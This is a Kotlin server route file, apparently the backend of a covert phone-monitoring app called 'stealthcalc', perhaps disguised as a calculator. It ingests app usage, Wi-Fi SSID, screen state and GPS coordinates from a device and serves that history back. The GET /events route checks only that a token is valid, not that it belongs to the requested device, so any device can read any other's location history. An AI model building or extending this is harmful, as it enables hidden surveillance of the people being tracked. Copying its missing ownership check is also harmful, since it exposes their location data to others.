package com.stealthcalc.server.routes

import com.stealthcalc.server.ErrorResponse
import com.stealthcalc.server.EventBatch
import com.stealthcalc.server.EventPayload
import com.stealthcalc.server.auth.TokenAuth
import com.stealthcalc.server.db.Devices
import com.stealthcalc.server.db.Events
import com.stealthcalc.server.db.RecentState
import io.ktor.http.*
import io.ktor.server.application.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import org.jetbrains.exposed.sql.SqlExpressionBuilder.eq
import org.jetbrains.exposed.sql.and
import org.jetbrains.exposed.sql.insert
import org.jetbrains.exposed.sql.selectAll
import org.jetbrains.exposed.sql.transactions.transaction
import org.jetbrains.exposed.sql.update
import org.jetbrains.exposed.sql.upsert

fun Route.eventRoutes() {
    post("/events/batch") {
        val token = call.request.header("Authorization")?.removePrefix("Bearer ")
        if (token == null) {
            call.respond(HttpStatusCode.Unauthorized, ErrorResponse("Missing token"))
            return@post
        }

        val authenticatedDeviceId = TokenAuth.authenticateDevice(token)
        if (authenticatedDeviceId == null) {
            call.respond(HttpStatusCode.Unauthorized, ErrorResponse("Invalid token"))
            return@post
        }

        val batch = call.receive<EventBatch>()
        if (batch.deviceId != authenticatedDeviceId) {
            call.respond(HttpStatusCode.Forbidden, ErrorResponse("Device ID mismatch"))
            return@post
        }

        val now = System.currentTimeMillis()
        transaction {
            batch.events.forEach { event ->
                Events.insert {
                    it[id] = event.id
                    it[deviceId] = batch.deviceId
                    it[kind] = event.kind
                    it[payload] = event.payload
                    it[capturedAt] = event.capturedAt
                    it[receivedAt] = now
                }

                updateRecentState(batch.deviceId, event, now)
            }

            Devices.update({ Devices.id eq batch.deviceId }) {
                it[lastSeen] = now
            }
        }

        call.respond(HttpStatusCode.OK)
    }

    get("/events/{deviceId}") {
        val token = call.request.header("Authorization")?.removePrefix("Bearer ")
        if (token == null || TokenAuth.authenticateDevice(token) == null) {
            call.respond(HttpStatusCode.Unauthorized, ErrorResponse("Invalid token"))
            return@get
        }

        val deviceId = call.parameters["deviceId"] ?: return@get
        val since = call.request.queryParameters["since"]?.toLongOrNull() ?: 0L

        val events = transaction {
            Events.selectAll().where {
                (Events.deviceId eq deviceId) and (Events.capturedAt greater since)
            }.orderBy(Events.capturedAt).limit(500).map { row ->
                EventPayload(
                    id = row[Events.id],
                    kind = row[Events.kind],
                    payload = row[Events.payload],
                    capturedAt = row[Events.capturedAt],
                )
            }
        }

        call.respond(events)
    }
}

private fun updateRecentState(deviceId: String, event: EventPayload, now: Long) {
    val json = runCatching { Json.parseToJsonElement(event.payload).jsonObject }.getOrNull() ?: return

    when (event.kind) {
        "APP_USAGE" -> {
            val eventType = json["event"]?.jsonPrimitive?.content
            if (eventType == "FOREGROUND") {
                val pkg = json["packageName"]?.jsonPrimitive?.content ?: return
                val appName = json["appName"]?.jsonPrimitive?.content ?: pkg
                upsertState(deviceId, "currentApp", appName, now)
            }
        }
        "BATTERY" -> {
            json["level"]?.jsonPrimitive?.content?.let { upsertState(deviceId, "batteryLevel", it, now) }
            json["isCharging"]?.jsonPrimitive?.content?.let { upsertState(deviceId, "isCharging", it, now) }
        }
        "NETWORK" -> {
            json["ssid"]?.jsonPrimitive?.content?.let { upsertState(deviceId, "wifiSsid", it, now) }
        }
        "SCREEN_EVENT" -> {
            val screenEvent = json["event"]?.jsonPrimitive?.content
            val isOn = screenEvent == "SCREEN_ON" || screenEvent == "USER_PRESENT"
            upsertState(deviceId, "isScreenOn", isOn.toString(), now)
        }
        "LOCATION" -> {
            json["latitude"]?.jsonPrimitive?.content?.let { upsertState(deviceId, "latitude", it, now) }
            json["longitude"]?.jsonPrimitive?.content?.let { upsertState(deviceId, "longitude", it, now) }
        }
    }
}

private fun upsertState(deviceId: String, field: String, value: String, now: Long) {
    RecentState.upsert(RecentState.deviceId, RecentState.field) {
        it[RecentState.deviceId] = deviceId
        it[RecentState.field] = field
        it[RecentState.value] = value
        it[updatedAt] = now
    }
}
